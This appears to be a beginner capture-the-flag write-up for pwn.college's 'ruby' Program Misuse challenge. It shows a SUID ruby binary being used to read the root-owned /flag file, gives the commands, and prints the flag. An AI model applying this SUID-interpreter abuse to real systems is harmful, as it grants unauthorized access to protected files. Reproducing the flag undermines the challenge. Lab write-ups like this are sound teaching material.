---
layout: page
title: "Challenge Name: ruby"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/ruby`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/ruby
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/ruby
```

- The `s` in `-rws` indicates it's a SUID binary.
- `ruby` runs with **root privileges**.

## 🚀 Exploitation

We can simply use `ruby` to read flag from /flag as its suid set.

```bash
echo 'puts File.read("/flag")' > /tmp/readflag.rb
ruby /tmp/readflag.rb
```

Output:
```
pwn.college{0myJuALsill8aQVy80rpPn_J4mn.dVDOxwSM0IzMyEzW}
```
